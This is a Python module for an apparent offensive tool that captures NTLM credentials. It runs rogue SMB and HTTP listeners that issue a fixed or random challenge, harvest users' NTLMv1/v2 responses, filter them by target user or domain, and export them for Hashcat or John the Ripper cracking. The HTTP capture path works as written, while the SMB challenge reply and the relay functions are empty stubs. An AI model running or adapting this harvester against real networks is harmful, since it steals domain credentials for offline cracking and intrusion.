"""NTLM Hash Capture and Relay functionality.

Captures NTLMv1/v2 hashes from SMB, HTTP, and other protocols.
Optionally relays hashes to target systems.
"""

import asyncio
import hashlib
import struct
import socket
import logging
from dataclasses import dataclass, field
from typing import Optional, Callable
from datetime import datetime
from enum import Enum, auto

logger = logging.getLogger(__name__)


class NTLMVersion(Enum):
    """NTLM protocol version."""
    NTLMv1 = auto()
    NTLMv2 = auto()
    NTLMv2_SSP = auto()


@dataclass
class NTLMHash:
    """Captured NTLM hash."""
    timestamp: datetime
    version: NTLMVersion
    username: str
    domain: str
    source_ip: str
    source_port: int
    challenge: str
    response: str
    target_info: Optional[str] = None
    
    @property
    def hashcat_format(self) -> str:
        """Format hash for Hashcat cracking."""
        if self.version == NTLMVersion.NTLMv1:
            # Hashcat mode 5500
            return f"{self.username}::{self.domain}:{self.response}:{self.challenge}"
        else:
            # Hashcat mode 5600 (NTLMv2)
            return f"{self.username}::{self.domain}:{self.challenge}:{self.response}"
    
    @property
    def john_format(self) -> str:
        """Format hash for John the Ripper."""
        if self.version == NTLMVersion.NTLMv1:
            return f"{self.username}:$NETLM${self.challenge}${self.response}"
        else:
            return f"{self.username}:$NETNTLMv2${self.challenge}${self.response}"


@dataclass
class NTLMCaptureConfig:
    """NTLM capture server configuration."""
    interface: str = "eth0"
    smb_port: int = 445
    http_port: int = 80
    enable_smb: bool = True
    enable_http: bool = True
    challenge: Optional[bytes] = None  # Fixed challenge for testing
    
    # Filtering
    target_users: list[str] = field(default_factory=list)
    target_domains: list[str] = field(default_factory=list)


class NTLMNegotiateMessage:
    """NTLM Type 1 (Negotiate) message parser."""
    
    SIGNATURE = b"NTLMSSP\x00"
    MESSAGE_TYPE = 1
    
    @classmethod
    def parse(cls, data: bytes) -> Optional[dict]:
        """Parse NTLM Negotiate message."""
        try:
            if not data.startswith(cls.SIGNATURE):
                return None
            
            msg_type = struct.unpack('<I', data[8:12])[0]
            if msg_type != cls.MESSAGE_TYPE:
                return None
            
            flags = struct.unpack('<I', data[12:16])[0]
            
            return {
                'type': msg_type,
                'flags': flags,
            }
        except Exception:
            return None


class NTLMChallengeMessage:
    """NTLM Type 2 (Challenge) message builder."""
    
    SIGNATURE = b"NTLMSSP\x00"
    MESSAGE_TYPE = 2
    
    # Common flags
    NEGOTIATE_UNICODE = 0x00000001
    NEGOTIATE_NTLM = 0x00000200
    NEGOTIATE_TARGET_INFO = 0x00800000
    NEGOTIATE_VERSION = 0x02000000
    NEGOTIATE_128 = 0x20000000
    NEGOTIATE_56 = 0x80000000
    
    @classmethod
    def build(cls, challenge: bytes, target_name: str = "WORKGROUP") -> bytes:
        """Build NTLM Challenge message."""
        # Flags
        flags = (
            cls.NEGOTIATE_UNICODE |
            cls.NEGOTIATE_NTLM |
            cls.NEGOTIATE_TARGET_INFO |
            cls.NEGOTIATE_128 |
            cls.NEGOTIATE_56
        )
        
        # Target name (Unicode)
        target_bytes = target_name.encode('utf-16-le')
        target_len = len(target_bytes)
        
        # Target info (minimal)
        target_info = b'\x00\x00\x00\x00'  # Terminator
        target_info_len = len(target_info)
        
        # Build message
        msg = cls.SIGNATURE
        msg += struct.pack('<I', cls.MESSAGE_TYPE)  # Type 2
        msg += struct.pack('<HH', target_len, target_len)  # Target name length
        msg += struct.pack('<I', 56)  # Target name offset
        msg += struct.pack('<I', flags)  # Flags
        msg += challenge  # 8-byte challenge
        msg += b'\x00' * 8  # Reserved
        msg += struct.pack('<HH', target_info_len, target_info_len)  # Target info length
        msg += struct.pack('<I', 56 + target_len)  # Target info offset
        msg += target_bytes  # Target name
        msg += target_info  # Target info
        
        return msg


class NTLMAuthenticateMessage:
    """NTLM Type 3 (Authenticate) message parser."""
    
    SIGNATURE = b"NTLMSSP\x00"
    MESSAGE_TYPE = 3
    
    @classmethod
    def parse(cls, data: bytes) -> Optional[dict]:
        """Parse NTLM Authenticate message and extract hash."""
        try:
            if not data.startswith(cls.SIGNATURE):
                return None
            
            msg_type = struct.unpack('<I', data[8:12])[0]
            if msg_type != cls.MESSAGE_TYPE:
                return None
            
            # LM Response
            lm_len, lm_max, lm_offset = struct.unpack('<HHI', data[12:20])
            
            # NTLM Response
            nt_len, nt_max, nt_offset = struct.unpack('<HHI', data[20:28])
            
            # Domain
            dom_len, dom_max, dom_offset = struct.unpack('<HHI', data[28:36])
            
            # Username
            user_len, user_max, user_offset = struct.unpack('<HHI', data[36:44])
            
            # Extract values
            lm_response = data[lm_offset:lm_offset + lm_len].hex()
            nt_response = data[nt_offset:nt_offset + nt_len].hex()
            domain = data[dom_offset:dom_offset + dom_len].decode('utf-16-le', errors='ignore')
            username = data[user_offset:user_offset + user_len].decode('utf-16-le', errors='ignore')
            
            # Determine version
            if nt_len == 24:
                version = NTLMVersion.NTLMv1
            elif nt_len > 24:
                version = NTLMVersion.NTLMv2
            else:
                version = NTLMVersion.NTLMv2_SSP
            
            return {
                'type': msg_type,
                'version': version,
                'username': username,
                'domain': domain,
                'lm_response': lm_response,
                'nt_response': nt_response,
            }
        except Exception as e:
            logger.error(f"Failed to parse NTLM auth: {e}")
            return None


class SMBServer:
    """Minimal SMB server for NTLM hash capture."""
    
    SMB_HEADER = b'\xffSMB'
    SMB2_HEADER = b'\xfeSMB'
    
    def __init__(
        self,
        port: int,
        challenge: bytes,
        callback: Callable[[NTLMHash], None]
    ):
        self.port = port
        self.challenge = challenge
        self.callback = callback
        self._server: Optional[asyncio.Server] = None
        self._running = False
    
    async def start(self) -> None:
        """Start SMB server."""
        self._running = True
        self._server = await asyncio.start_server(
            self._handle_client,
            '0.0.0.0',
            self.port
        )
        logger.info(f"SMB capture server started on port {self.port}")
    
    async def _handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter
    ) -> None:
        """Handle SMB client connection."""
        addr = writer.get_extra_info('peername')
        logger.info(f"SMB connection from {addr}")
        
        try:
            # SMB negotiation flow (simplified)
            while self._running:
                # Read NetBIOS header
                nb_header = await asyncio.wait_for(reader.read(4), timeout=30)
                if not nb_header or len(nb_header) < 4:
                    break
                
                length = struct.unpack('>I', nb_header)[0] & 0x00FFFFFF
                data = await asyncio.wait_for(reader.read(length), timeout=30)
                
                if not data:
                    break
                
                # Check for NTLM messages in security blob
                ntlm_offset = data.find(b'NTLMSSP\x00')
                if ntlm_offset >= 0:
                    ntlm_data = data[ntlm_offset:]
                    await self._process_ntlm(ntlm_data, addr, writer)
                
        except asyncio.TimeoutError:
            pass
        except Exception as e:
            logger.debug(f"SMB handler error: {e}")
        finally:
            writer.close()
            await writer.wait_closed()
    
    async def _process_ntlm(
        self,
        data: bytes,
        addr: tuple,
        writer: asyncio.StreamWriter
    ) -> None:
        """Process NTLM message."""
        # Check message type
        msg_type = struct.unpack('<I', data[8:12])[0]
        
        if msg_type == 1:
            # Negotiate - send challenge
            challenge_msg = NTLMChallengeMessage.build(self.challenge)
            # Wrap in SMB response (simplified)
            await self._send_ntlm_challenge(writer, challenge_msg)
            
        elif msg_type == 3:
            # Authenticate - capture hash
            auth = NTLMAuthenticateMessage.parse(data)
            if auth:
                ntlm_hash = NTLMHash(
                    timestamp=datetime.now(),
                    version=auth['version'],
                    username=auth['username'],
                    domain=auth['domain'],
                    source_ip=addr[0],
                    source_port=addr[1],
                    challenge=self.challenge.hex(),
                    response=auth['nt_response'],
                )
                self.callback(ntlm_hash)
    
    async def _send_ntlm_challenge(
        self,
        writer: asyncio.StreamWriter,
        challenge: bytes
    ) -> None:
        """Send NTLM challenge wrapped in SMB."""
        # Simplified SMB2 response (real implementation needs full SMB)
        pass
    
    async def stop(self) -> None:
        """Stop SMB server."""
        self._running = False
        if self._server:
            self._server.close()
            await self._server.wait_closed()


class HTTPNTLMServer:
    """HTTP server with NTLM authentication for hash capture."""
    
    def __init__(
        self,
        port: int,
        challenge: bytes,
        callback: Callable[[NTLMHash], None]
    ):
        self.port = port
        self.challenge = challenge
        self.callback = callback
        self._server: Optional[asyncio.Server] = None
        self._running = False
    
    async def start(self) -> None:
        """Start HTTP NTLM server."""
        self._running = True
        self._server = await asyncio.start_server(
            self._handle_client,
            '0.0.0.0',
            self.port
        )
        logger.info(f"HTTP NTLM capture server started on port {self.port}")
    
    async def _handle_client(
        self,
        reader: asyncio.StreamReader,
        writer: asyncio.StreamWriter
    ) -> None:
        """Handle HTTP client."""
        addr = writer.get_extra_info('peername')
        
        try:
            # Read HTTP request
            request = b''
            while True:
                line = await asyncio.wait_for(reader.readline(), timeout=30)
                request += line
                if line == b'\r\n' or not line:
                    break
            
            # Check for Authorization header
            auth_header = None
            for line in request.split(b'\r\n'):
                if line.lower().startswith(b'authorization:'):
                    auth_header = line.split(b':', 1)[1].strip()
                    break
            
            if auth_header and auth_header.startswith(b'NTLM '):
                import base64
                ntlm_data = base64.b64decode(auth_header[5:])
                
                msg_type = struct.unpack('<I', ntlm_data[8:12])[0]
                
                if msg_type == 1:
                    # Send challenge
                    challenge_msg = NTLMChallengeMessage.build(self.challenge)
                    challenge_b64 = base64.b64encode(challenge_msg).decode()
                    
                    response = (
                        b'HTTP/1.1 401 Unauthorized\r\n'
                        b'WWW-Authenticate: NTLM ' + challenge_b64.encode() + b'\r\n'
                        b'Content-Length: 0\r\n'
                        b'Connection: keep-alive\r\n'
                        b'\r\n'
                    )
                    writer.write(response)
                    await writer.drain()
                    
                    # Continue to get Type 3
                    return await self._handle_client(reader, writer)
                    
                elif msg_type == 3:
                    # Capture hash
                    auth = NTLMAuthenticateMessage.parse(ntlm_data)
                    if auth:
                        ntlm_hash = NTLMHash(
                            timestamp=datetime.now(),
                            version=auth['version'],
                            username=auth['username'],
                            domain=auth['domain'],
                            source_ip=addr[0],
                            source_port=addr[1],
                            challenge=self.challenge.hex(),
                            response=auth['nt_response'],
                        )
                        self.callback(ntlm_hash)
                        logger.info(
                            f"[NTLM] Captured {auth['version'].name} hash: "
                            f"{auth['domain']}\\{auth['username']} from {addr[0]}"
                        )
                    
                    # Send success
                    response = (
                        b'HTTP/1.1 200 OK\r\n'
                        b'Content-Type: text/html\r\n'
                        b'Content-Length: 0\r\n'
                        b'\r\n'
                    )
                    writer.write(response)
                    await writer.drain()
            else:
                # No auth, request NTLM
                response = (
                    b'HTTP/1.1 401 Unauthorized\r\n'
                    b'WWW-Authenticate: NTLM\r\n'
                    b'Content-Length: 0\r\n'
                    b'\r\n'
                )
                writer.write(response)
                await writer.drain()
                
        except asyncio.TimeoutError:
            pass
        except Exception as e:
            logger.debug(f"HTTP NTLM error: {e}")
        finally:
            writer.close()
            await writer.wait_closed()
    
    async def stop(self) -> None:
        """Stop HTTP server."""
        self._running = False
        if self._server:
            self._server.close()
            await self._server.wait_closed()


class NTLMCapture:
    """NTLM hash capture orchestrator."""
    
    def __init__(self, config: Optional[NTLMCaptureConfig] = None):
        self.config = config or NTLMCaptureConfig()
        self._hashes: list[NTLMHash] = []
        self._servers: list = []
        self._running = False
        self._on_hash_callback: Optional[Callable[[NTLMHash], None]] = None
        
        # Generate or use fixed challenge
        self._challenge = self.config.challenge or self._generate_challenge()
    
    def _generate_challenge(self) -> bytes:
        """Generate random 8-byte challenge."""
        import os
        return os.urandom(8)
    
    def _handle_hash(self, ntlm_hash: NTLMHash) -> None:
        """Handle captured hash."""
        # Check filters
        if self.config.target_users:
            if ntlm_hash.username.lower() not in [u.lower() for u in self.config.target_users]:
                return
        
        if self.config.target_domains:
            if ntlm_hash.domain.lower() not in [d.lower() for d in self.config.target_domains]:
                return
        
        self._hashes.append(ntlm_hash)
        
        if self._on_hash_callback:
            self._on_hash_callback(ntlm_hash)
        
        logger.info(
            f"Captured {ntlm_hash.version.name}: "
            f"{ntlm_hash.domain}\\{ntlm_hash.username}"
        )
    
    def on_hash(self, callback: Callable[[NTLMHash], None]) -> None:
        """Set callback for captured hashes."""
        self._on_hash_callback = callback
    
    async def start(self) -> None:
        """Start NTLM capture servers."""
        self._running = True
        
        if self.config.enable_smb:
            smb = SMBServer(
                self.config.smb_port,
                self._challenge,
                self._handle_hash
            )
            self._servers.append(smb)
            await smb.start()
        
        if self.config.enable_http:
            http = HTTPNTLMServer(
                self.config.http_port,
                self._challenge,
                self._handle_hash
            )
            self._servers.append(http)
            await http.start()
        
        logger.info(f"NTLM capture started with challenge: {self._challenge.hex()}")
    
    async def stop(self) -> None:
        """Stop NTLM capture."""
        self._running = False
        for server in self._servers:
            await server.stop()
        self._servers.clear()
    
    @property
    def hashes(self) -> list[NTLMHash]:
        """Get captured hashes."""
        return self._hashes.copy()
    
    @property
    def challenge(self) -> str:
        """Get current challenge."""
        return self._challenge.hex()
    
    def export_hashcat(self, filepath: str) -> int:
        """Export hashes in Hashcat format."""
        with open(filepath, 'w') as f:
            for h in self._hashes:
                f.write(h.hashcat_format + '\n')
        return len(self._hashes)
    
    def export_john(self, filepath: str) -> int:
        """Export hashes in John format."""
        with open(filepath, 'w') as f:
            for h in self._hashes:
                f.write(h.john_format + '\n')
        return len(self._hashes)


@dataclass
class NTLMRelayConfig:
    """NTLM Relay attack configuration."""
    target_host: str
    target_port: int = 445
    target_protocol: str = "smb"  # smb, http, ldap
    auto_relay: bool = True


class NTLMRelay:
    """NTLM Relay attack - relay captured auth to target."""
    
    def __init__(self, config: NTLMRelayConfig):
        self.config = config
        self._results: list[dict] = []
    
    async def relay(self, ntlm_data: bytes, source: str) -> Optional[dict]:
        """Relay NTLM authentication to target."""
        # This is a simplified implementation
        # Real relay needs full protocol support
        
        logger.info(
            f"Relaying NTLM from {source} to "
            f"{self.config.target_host}:{self.config.target_port}"
        )
        
        try:
            if self.config.target_protocol == "smb":
                return await self._relay_smb(ntlm_data)
            elif self.config.target_protocol == "http":
                return await self._relay_http(ntlm_data)
            elif self.config.target_protocol == "ldap":
                return await self._relay_ldap(ntlm_data)
        except Exception as e:
            logger.error(f"Relay failed: {e}")
            return None
    
    async def _relay_smb(self, ntlm_data: bytes) -> Optional[dict]:
        """Relay to SMB target."""
        # Placeholder - needs full SMB implementation
        return {"status": "not_implemented", "protocol": "smb"}
    
    async def _relay_http(self, ntlm_data: bytes) -> Optional[dict]:
        """Relay to HTTP target."""
        # Placeholder - needs full HTTP NTLM implementation
        return {"status": "not_implemented", "protocol": "http"}
    
    async def _relay_ldap(self, ntlm_data: bytes) -> Optional[dict]:
        """Relay to LDAP target."""
        # Placeholder - needs full LDAP implementation
        return {"status": "not_implemented", "protocol": "ldap"}
    
    @property
    def results(self) -> list[dict]:
        """Get relay results."""
        return self._results.copy()

